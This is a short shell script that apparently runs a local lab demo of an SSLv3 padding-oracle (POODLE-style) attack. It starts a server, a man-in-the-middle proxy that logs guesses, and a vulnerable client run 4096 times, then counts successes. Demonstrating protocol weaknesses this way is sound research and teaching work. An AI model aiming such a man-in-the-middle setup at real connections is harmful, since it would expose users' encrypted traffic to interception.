#!/bin/sh

make

killall flexible_server >/dev/null 2>&1
./flexible_server min_version=ssl3 server_port=5556 >/dev/null &
SRV_PID=$!

killall mitm_proxy >/dev/null 2>&1
./mitm_proxy >/dev/null 2>guesses &
PXY_PID=$!

sleep 1

S=0
MAX=4096

for i in $(seq 1 $MAX); do
    printf "$i... "
    if ./vulnerable_client >/dev/null; then
        S=$(( $S + 1 ))
        printf "SUCCESS "
    fi
done

printf "\n$S (expected about $(( $MAX / 256 )))\n"

kill $SRV_PID
kill $PXY_PID
